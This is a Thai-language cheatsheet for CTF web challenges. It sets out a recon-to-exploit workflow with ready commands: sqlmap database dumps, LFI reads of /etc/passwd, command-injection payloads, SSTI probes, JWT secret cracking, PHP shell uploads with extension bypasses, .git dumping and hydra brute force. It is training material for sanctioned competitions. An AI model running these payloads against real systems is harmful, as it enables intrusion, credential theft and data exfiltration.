# Web Cheatsheet — แนวคิดและลำดับการแก้โจทย์เว็บ

> ใช้เมื่อ: โจทย์ให้ URL มา (เช่น `http://target:8080`)
> เครื่องมือที่อนุญาต: `curl`, `Burp Suite CE`, `ffuf`, `feroxbuster`, `gobuster`, `katana`, `sqlmap`, `jwt_tool`, `nmap`, `hydra`, `CyberChef`
> **ห้าม**: `dirsearch` (อยู่ใน Unapproved List) — ใช้ `ffuf` / `feroxbuster` / `gobuster` แทน

---

## 0) ลำดับการทำงาน (ทำตามนี้ทีละขั้น)

```
1. เปิดเว็บด้วยตา (Chrome)          -> เห็นอะไร? มีฟอร์มอะไร? มี hint ไหม?
2. curl -i                          -> header, cookie, framework
3. ดู source + comment + JS         -> บางที flag อยู่ในคอมเมนต์
4. robots.txt / sitemap.xml         -> path ที่ซ่อน
5. ffuf / feroxbuster               -> หา /admin /backup /flag
6. เจอช่องกรอก -> ทดสอบตามชนิด:
      login        -> SQLi / NoSQLi / weak creds
      search       -> SQLi / SSTI / XSS
      file=        -> LFI / path traversal
      url=         -> SSRF
      upload       -> bypass extension
      ping/host=   -> command injection
7. ได้ token/cookie -> ถอด JWT (jwt_tool)
8. ยังไม่ออก -> ดู ../Web/common_payloads.md
```

---

## 1) ขั้นแรก: ดูด้วยตา + curl

```bash
# header ทั้งหมด (ดู Server, X-Powered-By, Set-Cookie)
curl -i http://target:8080/

# ตาม redirect + เก็บ cookie
curl -i -L -c cookies.txt http://target:8080/

# ใช้ cookie ที่มี
curl -b cookies.txt http://target:8080/admin

# ดูว่า status เป็นอะไร (ไม่ต้องโหลด body)
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://target:8080/admin
```

**สิ่งที่ต้องดูใน header:**

| header | บอกอะไร |
|---|---|
| `Server: nginx/1.18` | เว็บเซิร์ฟเวอร์ (ช่องโหว่ตามเวอร์ชัน) |
| `X-Powered-By: PHP/8.1` | ภาษา (PHP → LFI/deserialization) |
| `Set-Cookie: session=...` | อาจเป็น JWT / base64 / flask session |
| `Location:` | redirect ไปที่ซ่อน |
| `Access-Control-Allow-Origin: *` | CORS เปิด (อาจดึงข้อมูลข้ามโดเมน) |

---

## 2) หา path ที่ซ่อน

```bash
# ffuf (เร็วสุด)
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,204,301,302,401,403 -t 40

# feroxbuster (ไล่ต่ออัตโนมัติ)
feroxbuster -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# gobuster
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -s 200,301,302,403

# katana (crawler — เก็บ link ทั้งเว็บ)
katana -u http://target -d 3 -o urls.txt
```

**path ที่ต้องลองด้วยมือเสมอ:**

```
/robots.txt   /sitemap.xml   /.git/HEAD   /.env   /backup.zip
/admin/       /flag          /flag.txt    /debug  /console
/api/         /api/v1/       /swagger      /phpinfo.php
```

```bash
for p in robots.txt sitemap.xml .git/HEAD .env backup.zip admin/ flag flag.txt debug; do
  printf '%-15s ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' "http://target/$p"
done
```

---

## 3) ชนิดช่องโหว่ → วิธีทดสอบเร็ว

### 3.1 SQL Injection

```bash
# ตรวจว่ามีช่องโหว่ไหม (error-based)
curl -s "http://target/item.php?id=1'"
curl -s "http://target/item.php?id=1%20AND%201=2"

# ให้ sqlmap ทำงานแทน (อ่านง่าย ปลอดภัยกว่าเดา)
sqlmap -u "http://target/item.php?id=1" --batch --dbs
sqlmap -u "http://target/item.php?id=1" --batch -D <db> --tables
sqlmap -u "http://target/item.php?id=1" --batch -D <db> -T <table> --dump

# login form (POST)
sqlmap -u "http://target/login.php" --data="user=a&pass=b" --batch --dbs
```

### 3.2 LFI / Path Traversal

```bash
curl -s "http://target/index.php?page=../../../../etc/passwd"
curl -s "http://target/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
```

### 3.3 Command Injection

```bash
curl -s "http://target/ping.php?ip=127.0.0.1;id"
curl -s "http://target/ping.php?ip=127.0.0.1|whoami"
curl -s "http://target/ping.php?ip=127.0.0.1\$(cat%20/flag)"
```

### 3.4 SSTI (template injection)

```bash
curl -s "http://target/?name={{7*7}}"        # ถ้าได้ 49 = มีช่องโหว่
curl -s "http://target/?name={{config}}"
```

### 3.5 JWT

```bash
jwt_tool <token>                              # ถอด + ตรวจจุดอ่อน
jwt_tool <token> -T                            # โหมดแก้ token (แก้ payload)
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt   # crack secret
```

### 3.6 Upload file

```bash
curl -F "file=@shell.php" http://target/upload.php
# ถ้าโดนบล็อกนามสกุล ลอง: shell.php5 .phtml .phar .PHP .php.jpg
```

---

## 4) เทคนิคจาก writeup จริง

### 4.1 "ping pwn" (Web / Command Injection)

โจทย์ให้หน้าเว็บที่ทำ ping — จุดอ่อนคือเอา input ไปต่อในคำสั่ง shell ตรง ๆ

```bash
curl "http://target/ping.php?ip=127.0.0.1;cat%20/flag.txt"
```

### 4.2 "N1: Man in the flag" (Network/Web — S3 presigned URL)

โจทย์ให้ pcap ที่มี request ไป S3 — ต้องเห็น header ที่ใช้เข้ารหัสฝั่งลูกค้า

```bash
curl -H 'x-amz-server-side-encryption-customer-algorithm: AES256' \
     -H 'x-amz-server-side-encryption-customer-key: <key>' \
     -H 'x-amz-server-side-encryption-customer-key-MD5: <md5>' \
     'https://<bucket>.s3.amazonaws.com/<object>'
```

> บทเรียน: **header ที่แปลก ๆ ใน pcap** คือเบาะแสว่าต้อง replay request ด้วย header เดียวกัน

### 4.3 "Web file viewer" (Web — LFI)

หน้าเว็บมี `?file=` → ลอง path traversal และ php filter (ดูข้อ 3.2)

---

## 5) อ่านซอร์สโค้ดเว็บ (สำคัญมาก)

```bash
curl -s http://target/ | grep -i -E '<!--|flag|todo|admin'
curl -s http://target/static/app.js | head -100
curl -s http://target/.git/HEAD           # ถ้าเปิด git ไว้ = ดึงซอร์สทั้งเว็บได้
```

ถ้าเจอ `.git/` ให้ dump ทั้ง repo:

```bash
# วิธีเร็ว: ใช้ git-dumper (ถ้ามี) หรือ curl ทีละไฟล์
git clone http://target/.git/ repo 2>/dev/null || echo "ต้องดึงทีละไฟล์"
```

**ภาษา PHP ที่เจอบ่อย:**

```php
<?php
  include($_GET['page']);        // LFI
  system("ping " . $_GET['ip']); // command injection
  echo file_get_contents($file); // path traversal
  unserialize($_COOKIE['x']);    // PHP deserialization
?>
```

---

## 6) Cookie / Session

```bash
# ดูคุกกี้ทั้งหมด
curl -i http://target/ | grep -i set-cookie

# Flask session (ขึ้นต้นด้วย eyJ... และมี . คั่น 3 ส่วน)
python3 -c "
import base64,json,sys
t=sys.argv[1].split('.')[1]
print(json.loads(base64.urlsafe_b64decode(t+'===')))" '<token>'

# แก้ cookie แล้วส่งไปใหม่
curl -b 'role=admin' http://target/dashboard
```

รายละเอียด JWT → `../Web/commands.md` หัวข้อ jwt_tool

---

## 7) ถ้าเป็น API (JSON)

```bash
curl -s http://target/api/users | jq
curl -s -X POST http://target/api/login -H 'Content-Type: application/json' \
     -d '{"username":"admin","password":"admin"}' | jq

# ลอง method อื่น
curl -s -X OPTIONS -i http://target/api/users
curl -s -X PUT http://target/api/users/1 -d '{"role":"admin"}'
```

---

## 8) เครื่องมือเสริม

| งาน | คำสั่ง |
|---|---|
| intercept/แก้ request | เปิด **Burp Suite CE** → ตั้ง proxy 127.0.0.1:8080 |
| brute force login | `hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"` |
| สแกน port | `nmap -sV -p- target` |
| crawl ทั้งเว็บ | `katana -u http://target -d 3` |
| หา subdomain | `subfinder -d target.com` |

---

## 9) Checklist ก่อนบอกว่า "ทำไม่ได้"

- [ ] ดู source code + comment ครบหรือยัง
- [ ] ลอง `robots.txt`, `.git/`, `.env`, `backup.zip` แล้วหรือยัง
- [ ] เปลี่ยน method (GET→POST→PUT) หรือยัง
- [ ] ใส่ header แปลก ๆ (`X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`) หรือยัง
- [ ] ดู cookie ว่าถอดได้ไหม (base64/JWT)
- [ ] ffuf ด้วย wordlist ใหญ่ขึ้นหรือยัง
- [ ] error message บอกอะไร (path, SQL, stack trace)

---

## 10) กฎในสนาม

- ยิงเฉพาะ target ที่โจทย์ให้มา (IP/โดเมนในขอบเขต) เท่านั้น
- อย่าใช้ `--os-shell` หรือ destructive payload กับโจทย์ที่ไม่ต้องการ
- เก็บ log ทุกคำสั่ง (`script session.log`) เผื่อต้องเขียน writeup
